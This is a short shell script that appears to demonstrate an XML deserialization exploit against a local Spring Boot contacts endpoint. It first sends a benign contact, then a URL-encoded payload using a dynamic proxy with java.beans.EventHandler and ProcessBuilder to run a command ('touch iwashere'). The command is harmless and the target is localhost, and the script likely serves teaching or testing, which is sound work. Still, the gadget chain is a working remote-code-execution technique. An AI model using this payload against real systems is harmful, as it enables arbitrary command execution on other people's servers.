#!/bin/sh

badPayload(){
cat <<EOF
<contact class='dynamic-proxy'>
  <interface>com.example.springboot.Controller\$Contact</interface>
  <handler class='java.beans.EventHandler'>
    <target class='java.lang.ProcessBuilder'>
      <command>
        <string>touch</string>
        <string>iwashere</string>
      </command>
    </target>
    <action>start</action>
  </handler>
</contact>
EOF
}

urlEncode(){
  printf %s "$1" | jq -sRr @uri
}

goodPayload="$(urlEncode "<contact><firstName>Sebastian</firstName></contact>")"
curl "http://localhost:8080/contacts/xml/create?serializedContact=${goodPayload}"

badPayload="$(urlEncode "$(badPayload)")"
curl "http://localhost:8080/contacts/xml/create?serializedContact=${badPayload}"
